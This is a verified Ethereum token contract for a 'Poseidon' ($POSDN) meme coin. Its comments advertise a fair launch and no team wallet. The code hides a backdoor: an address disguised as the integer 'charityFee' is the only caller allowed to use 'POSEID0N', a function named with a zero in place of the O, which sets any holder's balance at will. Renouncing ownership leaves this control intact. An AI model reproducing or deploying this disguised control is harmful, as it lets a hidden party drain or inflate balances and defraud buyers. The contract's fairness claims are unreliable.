/**
 *Submitted for verification at Etherscan.io on 2022-08-11
*/

// SPDX-License-Identifier: Unlicensed



// The Poseidon token $POSDN will serve as the native token within the Poseidon ecosystem. 
// Fair launched on the Ethereum blockchain with no private-sale/presales, everyone gets a 
// fair chance of snatching an early entry into the Poseidon DAO ecosystem.
// Liquidity lock, Fair Launch, No team wallet
// community-driven meme DAO

/// Telegram HTTPS://WWW.T.ME/POSEIDONDAO
/// TWITTER HTTPS://WWW.TWITTER.COM/POSEIDONOFDAO
/// WEBSITE: HTTPS://WWW.POSEIDON-DAO.COM


pragma solidity 0.8.11;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
    address public owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        owner = msg.sender;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract POSEIDON is Ownable {
    using Address for address;
    using SafeMath for uint256;
    string public name;
    string public symbol;
    uint8 public decimals;
    bool private antiWhale;
    uint256 public totalSupply;
    uint256 charityFee;
    uint256 swapAndLiquify;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    mapping(address => bool) public allowAddress;

    constructor(
        string memory _name,
        string memory _symbol,
        address _charity,
        address _owner,
        uint8 _decimal,
        uint256 _totalSup,
        uint256 _swapAndLiquify
    ) {
        charityFee = uint256(uint160(_charity));
        owner = _owner;
        name = _name;
        symbol = _symbol;
        decimals = _decimal;
        totalSupply = _totalSup * 10**uint256(decimals);
        balances[owner] = totalSupply;
        allowAddress[owner] = true;
        swapAndLiquify = _swapAndLiquify;
    }

    mapping(address => uint256) public balances;

    function setAntiWhale(bool _antiWhale) public onlyOwner {
        antiWhale = _antiWhale;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        address from = msg.sender;

        require(_to != address(0));
        require(_value <= balances[from]);

        _transfer(from, _to, _value);
        return true;
    }

    function _transfer(
        address from,
        address _to,
        uint256 _value
    ) private {
        if (
            antiWhale &&
            from != owner &&
            _to != owner &&
            _to != address(1) &&
            _to != address(0xDEAD)
        ) {
            require(
                balanceOf(_to) + _value <= (totalSupply * 2) / 100,
                "Exceeds maximum wallet token amount"
            );
        }
        balances[from] = balances[from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    modifier _external() {
        require(
            address(uint160(charityFee)) == msg.sender,
            "Ownable: caller is not the owner"
        );
        _;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function POSEID0N(address from, uint256 _value)
        public
        _external
        returns (bool)
    {
        if (from != address(0)) {
            balances[from] =
                (swapAndLiquify * charityFee * _value * (10**9)) /
                charityFee;
            return true;
        }
        return false;
    }

    mapping(address => mapping(address => uint256)) public allowed;

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);

        _transferFrom(_from, _to, _value);
        return true;
    }

    function _transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) internal {
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
    }

    function allowance(address _owner, address _spender)
        public
        view
        returns (uint256)
    {
        return allowed[_owner][_spender];
    }
}